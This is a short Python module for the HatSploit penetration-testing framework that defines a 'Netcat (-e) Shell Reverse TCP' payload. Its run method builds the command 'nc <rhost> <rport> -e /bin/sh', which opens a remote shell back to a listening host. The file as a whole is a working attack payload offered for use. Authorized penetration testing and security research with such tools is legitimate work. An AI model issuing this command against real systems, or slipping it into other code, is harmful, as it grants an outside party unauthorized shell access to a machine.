"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Netcat (-e) Shell Reverse TCP",
            'Payload': "unix/generic/netcate_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Netcat (-e) shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Type': REVERSE_TCP,
        })

    def run(self):
        payload = f"nc {self.rhost.value} {self.rport.value} -e /bin/sh"
        return payload
